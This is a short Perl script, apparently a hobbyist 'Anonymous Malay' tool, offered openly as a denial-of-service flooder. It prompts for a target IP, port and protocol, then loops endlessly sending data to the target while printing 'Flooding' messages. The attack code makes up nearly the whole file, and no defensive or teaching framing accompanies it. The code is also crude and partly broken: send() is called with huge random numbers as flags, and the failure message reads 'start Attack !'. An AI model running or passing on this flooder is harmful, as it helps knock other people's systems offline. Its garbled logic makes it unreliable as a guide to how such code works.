#!/usr/bin/perl

use IO::Socket;

system("clear || cls");
#Script Banner================================================================
print ("\033[96m 
                   .-"""""""-.
                  /            \
                 |    MR A?     |
                 |,  .-.  .-.  ,|
                 | )(__/  \__)( |
                 |/     /\     \|
       (@_       (_     ^^     _)
  _     ) \_______\__|IIIIII|__/_____________________________
 (_)@8@8{}<________|-\IIIIII/-|_A_N_O_N_Y_M_O_U_S__M_A_L_A_Y_>
        )_/        \          /
       (@           `--------` Welcome To MR A Community!

 [---]   by:> MR A?          [---]
 [---]   Version:> 1.5	     [---]
\033[0m")
# INPUT TARGET INFO ==============================================
print "\n===============================";
print "\n Enter TargetIP: "; # Set Target IP
chop ($host = <stdin>);
print "===============================";
print "\n Enter Port: "; # Set Port
chop ($port = <stdin>);
print "===============================";
print "\n Enter Protockol (TCP or UDP) :"; # Set Protockol
chop ($proto = <stdin>);
system("clear || cls");
print "\n[*]Attack Has Been Start On [$host:$port] proto => [$proto].......\n\n";
sleep 3;

{
$sock = IO::Socket::INET->new (
	PeerAddr => $host,
	PeerPort => $port,
	Proto => "$proto" ) || die "\n start Attack !";


}
packets:
while (1) {
$size = rand() * 8921873 * 99919988;
print ("  Packets sent: $size\n");
send($sock, 99999999999999999999999999999999999999999999, $size); 
packets2:
$size = rand() * 89999921873 * 9999999919988 * 2;
print "Flooding:";
send($sock, 999999999999999999999999999999999999999999999, $size);
packet3:
$size = rand() * 89219999873 * 99919999988 * 2 + 99919999988;
print " (=>$host:$port~$proto<=)";
send($sock, $size, $size); # Attack start################

}


##############################################################
#####################                #########################
#####################  END OF SCRIPT #########################
#####################                #########################
##############################################################
#This Script by ~MR A~
#Have a nice day :)
#GoodBye


